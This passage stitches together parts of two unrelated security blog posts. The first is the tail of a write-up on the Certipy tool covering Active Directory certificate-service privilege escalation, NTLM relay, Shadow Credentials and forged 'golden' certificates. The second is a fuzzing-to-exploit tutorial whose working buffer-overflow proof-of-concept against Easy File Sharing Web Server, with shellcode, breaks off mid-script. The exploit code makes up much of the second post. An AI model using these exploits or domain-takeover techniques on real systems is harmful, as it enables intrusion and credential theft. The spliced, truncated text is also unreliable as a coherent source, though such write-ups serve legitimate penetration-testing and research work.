escalation.\nESC6 \u2014 EDITF_ATTRIBUTESUBJECTALTNAME2\nFind Certificate Authorities with User Specified SAN (ESC6)\nESC6 is when the CA specifies the EDITF_ATTRIBUTESUBJECTALTNAME2 flag.\nIn essence, this flag allows the enrollee to specify an arbitrary SAN\non all certificates despite a certificate template\u2019s configuration. In\nCertipy, this can be seen in the property \u201cUser Specified SAN\u201d of the\nCA. If this property is not shown, it means that Certipy couldn\u2019t get\nthe security and configuration of the CA.\nThe attack is the same as ESC1, except that we can choose any\ncertificate template that permits client authentication.\nESC7 \u2014 Vulnerable Certificate Authority Access Control\nShortest Paths to Vulnerable Certificate Authority Access Control from\nOwned Principals (ESC7)\nESC7 is when a user has the Manage CA or Manage Certificates access\nright on a CA. While there are no public techniques that can abuse only\nthe Manage Certificates access right for domain privilege escalation,\nwe can still use it to issue or deny pending certificate requests.\nWe\u2019ve seen this misconfiguration on one of our engagements. The\n[18]whitepaper mentions that this access right can be used to enable\nthe EDITF_ATTRIBUTESUBJECTALTNAME2 flag to perform the ESC6 attack, but\nthis will not have any effect until the CA service (CertSvc) is\nrestarted. When a user has the Manage CA access right, the user is\nallowed to restart the service. However, it does not mean that the user\ncan restart the service remotely and we were also not allowed to\nrestart this service on our engagement.\nIn the following, I will explain a new technique I found that doesn\u2019t\nrequire any service restarts or configuration changes.\nIn order for this technique to work, the user must also have the Manage\nCertificates access right, and the certificate template SubCA must be\nenabled. Fortunately, with our Manage CA access right, we can fulfill\nthese prerequisites if needed.\nIf we don\u2019t have the Manage Certificates access right, we can just add\nourselves as a new \u201cofficer\u201d. An officer is just the term for a user\nwith the Manage Certificates access right, as per [19]MS-CSRA 3.1.1.7.\nAfter running a new Certipy enumeration with the find command, and\nimporting the output into BloodHound, we should now see that JOHN has\nthe Manage Certificates and Manage CA access right.\nShortest Paths to Vulnerable Certificate Authority Access Control from\nOwned Principals (ESC7)\nThe next requirement is that the default certificate template SubCA is\nenabled. We can list the enabled certificate templates on a CA with the\n-list-templates parameter, and in this case, the SubCA template is not\nenabled on our CA.\nWith our Manage CA access right, we can just enable the SubCA\ncertificate template with the -enable-template parameter.\nThe SubCA certificate template is now enabled, and we\u2019re ready to\nproceed with the new attack.\nThe SubCA certificate template is enabled by default, and it\u2019s a\nbuilt-in certificate template, which means that it cannot be deleted in\nthe Certificate Templates Console (MMC).\nThe SubCA certificate template is interesting because it is vulnerable\nto ESC1 (Enrollee Supplies Subject and Client Authentication).\nHowever, only DOMAIN ADMINS and ENTERPRISE ADMINS are allowed to enroll\nin the SubCA certificate template.\nShow Enrollment Rights for Certificate Template\nBut if a user has the Manage CA access right and the Manage\nCertificates access right, the user can effectively issue failed\ncertificate requests.\nLet\u2019s try to request a certificate based on the SubCA certificate\ntemplate, where we specify the SAN administrator@corp.local.\nWe get a CERTSRV_E_TEMPLATE_DENIED error, meaning that we are not\nallowed to enroll in the template. Certipy will ask if we still want to\nsave the private key for our request, and in this case, we answer \u201cy\u201d\n(for yes). Certipy also prints out the request ID, which we\u2019ll use for\nissuing the certificate.\nWith our Manage CA and Manage Certificates access right, we can issue\nthe failed certificate request with the ca command by specifying the\nrequest ID in -issue-request parameter.\nWhen we\u2019ve issued the certificate, we can now retrieve it with the req\ncommand by specifying the -retrieve parameter with our request ID.\nIt is now possible to use the certificate to obtain the password hash\nof the administrator account.\nESC8 \u2014 NTLM Relay to AD CS HTTP Endpoints\nFind Certificate Authorities with HTTP Web Enrollment (ESC8)\nESC8 is when an Enrollment Service has installed and enabled HTTP Web\nEnrollment. This is attack is already implemented in Impacket\u2019s\nntlmrelayx, but I thought there was room for improvements and new\nfeatures.\nIn Certipy, this vulnerability can be seen in the property \u201cWeb\nEnrollment\u201d of the CA.\nTo start the relay server, we just run the relay command and specify\nthe CA\u2019s IP.\nBy default, Certipy will request a certificate based on the Machine or\nUser template depending on whether the relayed account name ends with\n$. It is possible to specify another template with the -template\nparameter.\nWe can then use a technique such as [20]PetitPotam to coerce\nauthentication from a computer. In this example, I simply made a dir\n\\\\IP\\foo\\bar from an administrator command prompt.\nCertipy will relay the NTLM authentication to the Web Enrollment\ninterface of the CA and request a certificate for the user.\nNow, let\u2019s consider a scenario where all certificate requests must be\napproved by an officer, and we have the Manage Certificates access\nright.\nIn this scenario, Certipy will ask if we want to save the private key\nfor our request. In this case, we answer yes.\nWith our Manage Certificates access right, we can issue the request\nbased on the request ID.\nWe then start the relaying server again, but this time, we specify\n-retrieve with our request ID.\nCertipy will retrieve the certificate based on the request ID rather\nthan requesting a new one. This is an edge case, but I thought it was\ninteresting to implement nonetheless.\nShadow Credentials\nOne of the new edges in BloodHound 4.1.0 is AddKeyCredentialLink.\nPath from JOHN to JOHNPC\nThe attack has been dubbed [21]Shadow Credentials, and it can be used\nfor account takeover. As mentioned earlier, this technique is related\nto certificates, and therefore, I have implemented the attack in\nCertipy. We can also abuse this technique when we have a \u201cGeneric\nWrite\u201d privilege over another user and we don\u2019t want to reset their\npassword.\nAuto\nThe command you\u2019ll likely use the most is auto, which we saw earlier.\nIn essence, Certipy will create and add a new Key Credential,\nauthenticate with the certificate, and then restore the old Key\nCredential attribute of the account. This is useful if you just want\nthe NT hash of the victim account, like in the previous ESC4 scenario.\nAdd\nIf you want to add a Key Credential manually for persistence, you can\nuse the add action. This will add a new Key Credential and save the\ncertificate and private key, which can be used later with Certipy\u2019s\nauth command.\nList\nIt is also possible to list the current Key Credentials of an account.\nThis is useful for deleting or getting detailed information about a\nspecific Key Credential.\nInfo\nInformation about a Key Credential can be retrieved with the info\naction, where the Key Credential can be specified with the -device-id.\nRemove\nTo remove a Key Credential, you can use the remove action and specify\nthe Key Credential in the -device-id parameter.\nClear\nAlternatively, you can just clear all of the Key Credentials for the\naccount if desired.\nGolden Certificates\nAnother new major feature of Certipy is the ability to create \u201cGolden\nCertificates\u201d. This is a technique for domain persistence after\ncompromising the CA server or domain. It\u2019s an alternative to \u201cGolden\nTickets\u201d, but instead of forging tickets, you can forge certificates\nthat can be used for Kerberos authentication.\nBackup\nThe first step is to get the certificate and private key of the CA.\nSuppose we have compromised the domain administrator administrator and\nwe want to retrieve the certificate and private key of the CA. This can\nbe done in the Certification Authority Console on the CA server, but I\nhave implemented this in Certipy as well.\nIn essence, Certipy will create a new service on the CA server which\nwill backup the certificate and private key to a predefined location.\nThe certificate and private key will then be retrieved via SMB, and\nfinally the service and files are removed from the server.\nForging\nWith the CA certificate and private key, we can use Certipy\u2019s new forge\ncommand to create certificates for arbitrary users. In this case, we\ncreate a certificate for JOHN. The subject doesn\u2019t matter in this case,\njust the SAN.\nWe can then use the certificate to authenticate as JOHN.\nIt also works for the domain controller DC$.\nIt does not, however, work for disabled accounts, such as the krbtgt\naccount.\nOther Improvements\nThe latest release of Certipy also contains a few minor improvements\nand adjustments.\nCertificate Authority Management\nWe saw earlier how we could enable a certificate template. If we want\nto cleanup after ourselves, we can disable the template, as shown\nbelow.\nWe can also remove JOHN as an officer, but we\u2019ll still have our Manage\nCA access rights.\nAs we can see below, if we try to perform the ESC7 attack now, we get\nan \u201caccess denied\u201d when trying to issue the certificate.\nJOHN can also add another manager, for instance JANE.\nJANE can then add a third manager, EVE.\nJANE can even remove herself as a manager.\nBut then she won\u2019t be able to remove EVE as a manager.\nDynamic Endpoints\nThis is a minor, but important new feature. During one of our\nengagements, SMB was firewalled off on the CA server. The previous\nrelease of Certipy requested certificates via the named pipe cert, and\nwhen SMB was firewalled off, then the old version was not able to\nrequest certificates.\nHowever, the CA service actually listens on a dynamic TCP endpoint as\nwell. The new version of Certipy will try to connect to the dynamic TCP\nendpoint, if SMB fails.\nAlternatively, you can specify the -dynamic-endpoint parameter to\nprefer the dynamic TCP endpoint over SMB. This is useful if you don\u2019t\nwant to wait for the timeout for each request when SMB is firewalled\noff.\nFor slower connections, such as through a proxy, it\u2019s also possible to\nspecify a longer timeout than the default 5 seconds for almost all\ntypes of commands with the -timeout parameter.\nThe new version of Certipy has many more improvements and parameters\nthan I\u2019ve shown in this blog post. I recommend that you explore the new\nfeatures and parameters of Certipy if you find yourself in an unusual\nsituation. If you have any issues or feature requests, I encourage you\nto submit them on Github. I hope you will enjoy the new version of\nCertipy.\nThe new version can be found here: [22]https:\/\/github.com\/ly4k\/Certipy\nAdc\nCertipy\nBloodhound\nShadow Credentials\nGolden Certificates\n--\n--\n(BUTTON)\n(BUTTON)\nOliver Lyak\nIFCR\n[23]Follow\n[24](BUTTON)\n[25]\nWritten by Oliver Lyak\n[26]286 Followers\n\u00b7Editor for\n[27]\nIFCR\nTwitter: [28]https:\/\/twitter.com\/ly4k_ Github:\n[29]https:\/\/github.com\/ly4k\/\n[30]Follow\n[31](BUTTON)\n[32]\nHelp\n[33]\nStatus\n[34]\nAbout\n[35]\nCareers\n[36]\nBlog\n[37]\nPrivacy\n[38]\nTerms\n[39]\nText to speech\n[40]\nTeams"}
{"text":"#[1]Techorganic - Musings from the brainpan\n[2][glider.png]\n[3]Techorganic\nMusings from the brainpan\n[4]About [5]Contact [6]Disclaimer [7]Vulns [8]Slides\nFrom fuzzing to 0-day\nWritten on May 14, 2014\nA couple of days ago, I found an interesting bug during a fuzzing\nsession that led to me creating a 0-day exploit for it. I\u2019ve been asked\na few times about the methods I use to find bugs and write exploits, so\nI\u2019ve decided to take this opportunity to describe one particular\nworkflow I use. In this post, I\u2019ll take you through finding a bug,\nanalzying it, and creating a functional exploit.\nIn order to benefit from this post, you should be familiar with basic\nfuzzing and exploit development.\nThe tools\n* [9]ImmunityDebugger is my debugger of choice. Coupled with\n[10]mona.py, it becomes a powerful exploit development tool.\n* [11]Peach Fuzzer and [12]WinDbg. Peach will run a series of test\ncases against an application and uses WinDbg to record any crash\nthat occurs. After a record of the crash has been made, Peach will\nrestart the application and continue with the next test case.\nBecause of this, Peach can usually find different categories of\nbugs, some of which are exploitable, and others that might not be.\n* [13]SocketSniff. This is a lightweight tool that captures packets\nflowing in and out of a process. The data captured by SocketSniff\nis helpful when writing a Peach Pit.\nThe Target: Easy File Sharing Web Server\nI\u2019ve selected [14]EFS Software\u2019s [15]Easy File Sharing Web Server 6.8\nas the application to analyze. This is the latest release at the time\nof writing. I\u2019ll also be referring to it as EFSWS from here on because\nEasy File Sharing Web Server is a bit of a mouthful.\nEFSWS runs as a web server on port 80 and allows users to upload and\ndownload files using any web browser. Its main purpose is to allow\nusers to share files with one another.\nAnalyzing the application\nI installed EFSWS on a Windows XP Professional SP3 virtual machine that\nI downloaded from [16]modern.IE. modern.IE provides evaluation releases\nof Windows, from XP to 8.1, making it great for testing exploits. I\nused Windows XP for two reasons; lack of ASLR, and opt-in DEP. This\nmakes writing exploits easier, and you can always port it over to more\nrecent Windows releases later.\nWhen I first started EFSWS, I was greeted by a popup message asking if\nI wanted to buy the software or just run it as a trial.\nAs it turns out, this pops up every time EFSWS is started and blocks\nEFSWS from starting its web server until it\u2019s closed. Fortunately,\nPeach is capable of looking out for these popup windows and closing\nthem so that it can continue automating its test cases without us\nhaving to close the popup window manually.\nEFSWS has several options to customize its features. I decided to leave\nthem at their default setting.\nAt this point, EFSWS is listening on port 80, ready to serve requests\nfrom web browsers.\nBefore launching my web browser, I attached SocketSniff to it so I\ncould capture the messages sent between the web browser and EFSWS. Once\nthat was done, I used Firefox to navigate to EFSWS.\nI was greeted with a login screen. The first thing that caught my eye\nwas a hyperlink under the login button that said \u201clogin as a guest\u201d. I\nclicked on it and was presented with some virtual folders:\nI explored a little bit more and after a while, decided to see what\nSocketSniff had captured. One of the earlier captures was for the\nvfolder.ghp request:\nI noticed that the cookie contained key\/value pairs called UserID and\nPassWD. These keys had no values assigned to them, probably because I\nhad logged in as a guest. It looked like an interesting target to fuzz,\nso I decided to start with that.\nCreating the Peach Pit\nPeach uses XML files that describe how it should fuzz a target. These\nXML files are called Peach Pits. Using the capture from SocketSniff, I\ncreated a Peach Pit to fuzz UserID and PassWD when requesting\nvfolder.ghp:\n<?xml version=\"1.0\" encoding=\"utf-8\"?>\n<Peach xmlns=\"http:\/\/peachfuzzer.com\/2012\/Peach\" xmlns:xsi=\"http:\/\/www.w3.org\/20\n01\/XMLSchema-instance\"\nxsi:schemaLocation=\"http:\/\/peachfuzzer.com\/2012\/Peach ..\/peach.xsd\">\n<DataModel name=\"DataVfolder\">\n<String value=\"GET \/vfolder.ghp\" mutable=\"false\" token=\"\ntrue\"\/>\n<String value=\" HTTP\/1.1\" mutable=\"false\" token=\"true\"\/>\n<String value=\"\\r\\n\" mutable=\"false\" token=\"true\"\/>\n<String value=\"User-Agent: \" mutable=\"false\" token=\"true\n\"\/>\n<String value=\"Mozilla\/4.0\" mutable=\"false\" token=\"true\"\n\/>\n<String value=\"\\r\\n\" mutable=\"false\" token=\"true\"\/>\n<String value=\"Host: ##HOST##:##PORT##\" mutable=\"false\"\ntoken=\"true\"\/>\n<String value=\"\\r\\n\" mutable=\"false\" token=\"true\"\/>\n<String value=\"Accept: \" mutable=\"false\" token=\"true\"\/>\n<String value=\"text\/html,application\/xhtml+xml,applicati\non\/xml;q=0.9,*\/*;q=0.8\" mutable=\"false\" token=\"true\"\/>\n<String value=\"\\r\\n\" mutable=\"false\" token=\"true\"\/>\n<String value=\"Accept-Language: \" mutable=\"false\" token=\n\"true\"\/>\n<String value=\"en-us\" mutable=\"false\" token=\"true\"\/>\n<String value=\"\\r\\n\" mutable=\"false\" token=\"true\"\/>\n<String value=\"Accept-Encoding: \" mutable=\"false\" token=\n\"true\"\/>\n<String value=\"gzip, deflate\" mutable=\"false\" token=\"tru\ne\"\/>\n<String value=\"\\r\\n\" mutable=\"false\" token=\"true\"\/>\n<String value=\"Referer: \" mutable=\"false\" token=\"true\"\/>\n<String value=\"http:\/\/##HOST##\/\" mutable=\"false\" token=\"\ntrue\"\/>\n<String value=\"\\r\\n\" mutable=\"false\" token=\"true\"\/>\n<String value=\"Cookie: \" mutable=\"false\" token=\"true\"\/>\n<String value=\"SESSIONID=6771; \" mutable=\"false\" token=\"\ntrue\"\/>\n<!-- fuzz UserID -->\n<String value=\"UserID=\" mutable=\"false\" token=\"true\"\/>\n<String value=\"\" \/>\n<String value=\"; \" mutable=\"false\" token=\"true\"\/>\n<!-- fuzz PassWD -->\n<String value=\"PassWD=\" mutable=\"false\" token=\"true\"\/>\n<String value=\"\" \/>\n<String value=\"; \" mutable=\"false\" token=\"true\"\/>\n<String value=\"\\r\\n\" mutable=\"false\" token=\"true\"\/>\n<String value=\"Conection: \" mutable=\"false\" token=\"true\"\n\/>\n<String value=\"Keep-Alive\" mutable=\"false\" token=\"true\"\/\n>\n<String value=\"\\r\\n\" mutable=\"false\" token=\"true\"\/>\n<String value=\"\\r\\n\" mutable=\"false\" token=\"true\"\/>\n<\/DataModel>\n<DataModel name=\"DataResponse\">\n<!-- server reply, we don't care -->\n<String value=\"\" \/>\n<\/DataModel>\n<StateModel name=\"StateVfolder\" initialState=\"Initial\">\n<State name=\"Initial\">\n<Action type=\"output\">\n<DataModel ref=\"DataVfolder\"\/>\n<\/Action>\n<Action type=\"input\">\n<DataModel ref=\"DataResponse\"\/>\n<\/Action>\n<\/State>\n<\/StateModel>\n<Agent name=\"LocalAgent\">\n<Monitor class=\"WindowsDebugger\">\n<Param name=\"CommandLine\" value=\"C:\\EFS Software\\Easy Fi\nle Sharing Web Server\\fsws.exe\"\/>\n<\/Monitor>\n<!-- close the popup window asking us to buy the software before\nrunning tests -->\n<Monitor class=\"PopupWatcher\">\n<Param name=\"WindowNames\" value=\"Registration - unregist\nered\"\/>\n<\/Monitor>\n<\/Agent>\n<Test name=\"TestVfolder\">\n<Agent ref=\"LocalAgent\"\/>\n<StateModel ref=\"StateVfolder\"\/>\n<Publisher class=\"TcpClient\">\n<Param name=\"Host\" value=\"##HOST##\"\/>\n<Param name=\"Port\" value=\"##PORT##\"\/>\n<\/Publisher>\n<Logger class=\"File\">\n<!-- save crash information in the Logs directory -->\n<Param name=\"Path\" value=\"Logs\"\/>\n<\/Logger>\n<!-- use a finite number of test cases that test UserID first, f\nollowed by PassWD -->\n<Strategy class=\"Sequential\" \/>\n<\/Test>\n<\/Peach>\nOne of the new features of Peach 3 is the PopupWatcher Monitor. I\u2019m\nusing this Monitor to close the popup window asking us to purchase\nEFSWS whenever it\u2019s started. I\u2019m also using the placeholders ##HOST##\nand ##PORT## so I can specify the target\u2019s IP address and port on the\ncommand line instead of hardcoding it in the Peach Pit.\nReady, set, fuzz!\nI shutdown EFSWS and SocketSniff and went ahead and started the fuzzing\nsession using the following command:\npeach -DHOST=192.168.1.140 -DPORT=80 efs_fuzz.xml TestVfolder\nPeach immediately launched EFSWS, closed the popup window, and started\nthrowing test cases at the server. Within a few minutes, it started\nreporting crashes:\nAt this stage, I typically just let it do its thing for a few more\nminutes, or hours, depending on what crashes it\u2019s found so far.\nPicking an exploitable bug\nWhen I came back to it, I looked into the Logs directory to see what\ncrashes had been reported:\nThree of the directories created were labeled EXPLOITABLE, so those\nshould get higher priority in examination. After going through some of\nthe exploitable crash information, I settled on test case\nEXPLOITABLE_0x020c616f_0x021e756f\\518.\nThis is the data Peach sent to the server which triggered the crash:\nGET \/vfolder.ghp HTTP\/1.1\nUser-Agent: Mozilla\/4.0\nHost: 192.168.1.140:80\nAccept: text\/html,application\/xhtml+xml,application\/xml;q=0.9,*\/*;q=0.8\nAccept-Language: en-us\nAccept-Encoding: gzip, deflate\nReferer: http:\/\/192.168.1.140\/\nCookie: SESSIONID=6771; UserID=AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA; PassWD=;\nConection: Keep-Alive\nThe payload Peach used in this test case was a long string of \u201cA\u201ds, and\nit was assigned to UserID. At this point, PassWD isn\u2019t even being\nfuzzed yet. I looked at the corresponding\nWindowsDebugEngine_description.txt file to see the state of the\nregisters and the instruction that caused the crash:\neax=00000000 ebx=00000000 ecx=018f68f8 edx=41414141 esi=018f68e8 edi=018f68f8\neip=0045c8c2 esp=018f6830 ebp=ffffffff iopl=0         nv up ei pl nz na pe nc\ncs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00010206\nEDX was the only one that had been overwritten by the payload. EIP was\nintact, so what caused the crash? The faulting instruction provided the\nanswer:\n0045c8c2 ff5228          call    dword ptr [edx+28h]  ds:0023:41414169=????????\nIt was attempting to call a function pointed to by EDX+28, and it was\ncrashing because EDX+28 resulted in an invalid address of 0x41414169.\nThis meant I could redirect the execution flow anywhere I wanted to\nbecause I controlled the value stored in EDX!\nThe beginning of a proof-of-concept exploit\nI needed to take this test case used by Peach and convert it into a\nproof-of-concept (PoC) exploit. I created the following Python script\nwhich sent the same request as the test case:\nimport socket\nimport struct\ntarget = \"192.168.1.140\"\nport = 80\npayload = \"A\"*90\nbuf = (\n\"GET \/vfolder.ghp HTTP\/1.1\\r\\n\"\n\"User-Agent: Mozilla\/4.0\\r\\n\"\n\"Host:\" + target + \":\" + str(port) + \"\\r\\n\"\n\"Accept: text\/html,application\/xhtml+xml,application\/xml;q=0.9,*\/*;q=0.8\\r\\n\"\n\"Accept-Language: en-us\\r\\n\"\n\"Accept-Encoding: gzip, deflate\\r\\n\"\n\"Referer: http:\/\/\" + target + \"\/\\r\\n\"\n\"Cookie: SESSIONID=6771; UserID=\" + payload + \"; PassWD=;\\r\\n\"\n\"Conection: Keep-Alive\\r\\n\\r\\n\"\n)\ns = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\ns.connect((target, port))\ns.send(buf)\ns.close()\nNow that I could replicate the test case, I needed to examine what was\nhappening in memory when the crash was triggered.\nExamining the crash with Immunity Debugger\nI stopped the fuzzing session, restarted EFSWS, and attached Immunity\nDebugger to it. According to WindowsDebugEngine_description.txt, the\nfaulting instruction was at address 0x0045c8c2, so I set a breakpoint\nthere.\nI executed the PoC and the execution stopped at the breakpoint. A quick\nlook at the stack showed that my payload hadn\u2019t been received yet, so I\nhit F9 to continue execution. The breakpoint was hit a second time, and\nstill, the payload hadn\u2019t been received. I hit F9 once more, and this\ntime, I noticed that EDX had been overwritten with 0x41414141 and the\npayload was visible in the stack.\nECX, ESI, and EDI were all pointing to locations in the payload, and\nthe payload itself was located on the stack starting at address\n0x19f68a8\nI hit F9 to continue execution and an exception handler got triggered\ndue to an access violation when attempting to read 0x41414169. I took a\nquick peek at the SEH chain hoping to see an overwrite, but there was\nnone:\nI went ahead and hit Shift-F9 several times to pass the exception to\nthe application and it eventually recovered and waited for the next\nrequest. The server itself didn\u2019t crash, so I didn\u2019t need to restart it\nand reattach it to the debugger.\nBefore continuing further, I increased the size of the payload to 400\nbytes. 90 bytes is pretty small and you need at least 300 bytes for a\nbindshell shellcode. I made the following change and reran the PoC\npayload = \"A\"*400\nMuch like before, the payload made it into the stack and EDX was still\nbeing overwritten. It was time to take control of the application.\nHijacking execution flow\nTo hijack the execution flow, I needed to overwrite EDX, but before I\ncould do that, I needed to figure out what offset EDX was being\noverwritten at. I used Metasploit\u2019s pattern_create.rb to create a 400\nbyte cyclic pattern and used it as my payload.\npayload = \"Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2\nAc3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae\n9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5A\nh6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2\nAk3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am\n9An0An1An2A\"\nI executed the PoC and continued execution until EDX was overwritten\nwith part of the cyclic pattern:\nI ran this value against pattern_offset.rb and it returned the offset\n80. To verify this, I updated the payload to write 0x42424242 80 bytes\ninto the payload.\npayload = \"A\"*80 + \"B\"*4 + \"C\"*316\nI ran the PoC again and sure enough, EDX was overwritten with\n0x42424242\nNow that I knew EDX\u2019s offset, I needed to make it such that EDX+28\npointed to an address that contained a pointer to a set of instructions\nI wanted to execute. The easiest location to point to was on the stack.\nWindows XP doesn\u2019t come with ASLR, so the stack addresses aren\u2019t\nrandomized. Looking at the stack, I noticed the payload started at\n0x019F68a8 and ended at 0x019F6a34. All I needed to do was have EDX+28\nfall somewhere in between that range.\nWhat instructions should the pointer in that location point to? ECX,\nESI, and EDI all point to a location in the payload, so if I could find\na JMP or CALL instruction to one of those registers, it would redirect\nexecution into the payload and start executing whatever instructions I\nhad in there.\nAfter a bit of searching, I found a CALL ESI at 0x10023701 in EFSWS\u2019s\nImageLoad.dll.\nAll I needed to do was to put 0x10023701 somewhere on the stack that\nEDX+28 would resolve to. I decided to place it at 0x019F6968, which was\n108 bytes into the buffer of \u201cC\u201ds.\nThat meant EDX needed to be set to 0x019F6940, since 0x019F6940 + 28 =\n0x019F6968. The payload was updated to reflect this:\npayload =  \"A\"*80\npayload += struct.pack(\"<I\", 0x019F6940)\npayload += \"C\"*108\npayload += struct.pack(\"<I\", 0x10023701)\npayload += \"C\"*196\nI executed PoC again and hit F9 until the payload was received. EDX had\nnow been set to 0x019F6940 and the CALL instruction showed that it was\npointing to 0x10023701, an address in LoadImage.dll. I hit F7 to step\ninto the function and it took me to the CALL ESI instruction as\nexpected.\nESI was pointing to 0x019F68E8, which was 64 bytes into the payload:\nThere were only 16 bytes to work with here, but there was plenty of\nspace in the buffer of \u201cC\u201ds starting at 0x019F68FC.\nSince I had put the address of CALL ESI in 0x019F6968, I wanted to\nstore my shellcode past that address. That was too far from my current\nlocation, so a short jump wouldn\u2019t work.\nFortunately, I could reuse ESI again by adding a value to it, and then\ndoing a JMP ESI to jump to that new location. Adding 90 bytes to ESI\nwas sufficient to sail over 0x019F6968:\npayload =  \"A\"*64                            # padding\npayload += \"\\x81\\xee\\x70\\xff\\xff\\xff\"        # SUB ESI,-90\npayload += \"\\xff\\xe6\"                        # JMP ESI\npayload += \"A\"*8                             # padding\npayload += struct.pack(\"<I\", 0x019F6940)     # overwrite EDX with pointer to CAL\nL ESI\npayload += \"C\"*108                           # padding\npayload += struct.pack(\"<I\", 0x10023701)     # pointer to CALL ESI\nI ran the PoC once again, and stepped through the instructions.\nEverything worked as before, and after CALL ESI was executed, the\nexecution went to the SUB ESI,-90 and JMP ESI instructions:\nSUB ESI,-90 sets ESI to 0x019F6978, 12 bytes past 0x019F6968. This is\nwhere the shellcode will be placed.\nLet\u2019s pwn this thing!\nWhen working on a PoC, I prefer to stick with launching calc.exe for my\nshellcode. It\u2019s simple, small, fast, and easy to see in action. I used\nthe calc shellcode from\n[17]https:\/\/code.google.com\/p\/win-exec-calc-shellcode\/ and removed the\ncharacters 0x00 and 0x20.\n0x00 is a null byte, which would truncate the payload, and 0x20 is\nspace, which would also truncate the payload as it\u2019s being treated as a\nvalue assigned to UserID.\n# calc shellcode from https:\/\/code.google.com\/p\/win-exec-calc-shellcode\/\n# msfencode -b \"\\x00\\x20\" -i w32-exec-calc-shellcode.bin\n# [*] x86\/shikata_ga_nai succeeded with size 101 (iteration=1)\nshellcode = (\n\"\\xd9\\xcb\\xbe\\xb9\\x23\\x67\\x31\\xd9\\x74\\x24\\xf4\\x5a\\x29\\xc9\" +\n\"\\xb1\\x13\\x31\\x72\\x19\\x83\\xc2\\x04\\x03\\x72\\x15\\x5b\\xd6\\x56\" +\n\"\\xe3\\xc9\\x71\\xfa\\x62\\x81\\xe2\\x75\\x82\\x0b\\xb3\\xe1\\xc0\\xd9\" +\n\"\\x0b\\x61\\xa0\\x11\\xe7\\x03\\x41\\x84\\x7c\\xdb\\xd2\\xa8\\x9a\\x97\" +\n\"\\xba\\x68\\x10\\xfb\\x5b\\xe8\\xad\\x70\\x7b\\x28\\xb3\\x86\\x08\\x64\" +\n\"\\xac\\x52\\x0e\\x8d\\xdd\\x2d\\x3c\\x3c\\xa0\\xfc\\xbc\\x82\\x23\\xa8\" +\n\"\\xd7\\x94\\x6e\\x23\\xd9\\xe3\\x05\\xd4\\x05\\xf2\\x1b\\xe9\\x09\\x5a\" +\n\"\\x1c\\x39\\xbd\"\n)\nI updated the payload one more time to include a NOP sled and the\nshellcode:\npayload =  \"A\"*64                            # padding\npayload += \"\\x81\\xee\\x70\\xff\\xff\\xff\"        # SUB ESI,-90\npayload += \"\\xff\\xe6\"                        # JMP ESI\npayload += \"A\"*8                             # padding\npayload += struct.pack(\"<I\", 0x019F6940)     # overwrite EDX with pointer to CAL\nL ESI\npayload += \"C\"*108                           # padding\npayload += struct.pack(\"<I\", 0x10023701)     # pointer to CALL ESI\npayload += \"\\x90\"*20                         # NOP sled\npayload += shellcode                         # calc.exe\npayload += \"C\"*75                            # padding\nI executed the PoC and stepped through each instruction until it got to\nthe JMP ESI. I hit F7 to step through and it landed in the middle of\nthe NOP sled:\nConfident that everything should work from here on, I hit F9 to\ncontinue execution, and calc.exe popped up! The exploit worked.\nHere\u2019s the PoC after all the changes:\nimport socket\nimport struct\nimport time\ntarget = \"192.168.1.140\"\nport = 80\n# 101 byte calc.exe shellcode\nshellcode = (\n\"\\xd9\\xcb\\xbe\\xb9\\x23\\x67\\x31\\xd9\\x74\\x24\\xf4\\x5a\\x29\\xc9\" +\n\"\\xb1\\x13\\x31\\x72\\x19\\x83\\xc2\\x04\\x03\\x72\\x15\\x5b\\xd6\\x56\" +\n\"\\xe3\\xc9\\x71\\xfa\\x62\\x81\\xe2\\x75\\x82\\x0b\\xb3\\xe1\\xc0\\xd9\" +\n\"\\x0b\\x61\\xa0\\x11\\xe7\\x03\\x41\\x84\\x7c\\xdb\\xd2\\xa8\\x9a\\x97\" +\n\"\\xba\\x68\\x10\\xfb\\x5b\\xe8\\xad\\x70\\x7b\\x28\\xb3\\x86\\x08\\x64\" +\n\"\\xac\\x52\\x0e\\x8d\\xdd\\x2d\\x3c\\x3c\\xa0\\xfc\\xbc\\x82\\x23\\xa8\" +\n\"\\xd7\\x94\\x6e\\x23\\xd9\\xe3\\x05\\xd4\\x05\\xf2\\x1b\\xe9\\x09\\x5a\" +\n\"\\x1c\\x39\\xbd\"\n)\npayload =  \"A\"*64                            # padding\npayload += \"\\x81\\xee\\x70\\xff\\xff\\xff\"        # SUB ESI,-90\npayload += \"\\xff\\xe6\"                        # JMP ESI\npayload += \"A\"*8                             # padding\npayload += struct.pack(\"<I\", 0x019F6940)     # overwrite EDX with pointer to CAL\nL ESI\npayload += \"C\"*108                           # padding\npayload += struct.pack(\"<I\", 0x10023701)     # pointer to CALL ESI\npayload += \"\\x90\"*20                         # NOP sled\npayload += shellcode                         # calc.exe\npayload += \"C\"*75                            # padding\nbuf = (\n\"GET \/vfolder.ghp HTTP\/1.1\\r\\n\"\n\"User-Agent: Mozilla\/4.0\\r\\n\"\n\"Host:\" + target + \":\" + str(port) + \"\\r\\n\"\n\"Accept: text\/html,application\/xhtml+xml,application\/xml;q=0.9,*\/*;q=0.8\\r\\n\"\n\"Accept-Language: en-us\\r\\n\"\n\"Accept-Encoding: gzip, deflate\\r\\n\"\n\"Referer: http:\/\/\" + target + \"\/\\r\\n\"\n\"Cookie: SESSIONID=6771; UserID=\" + payload + \"; PassWD=;\\r\\n\"\n\"Conection: 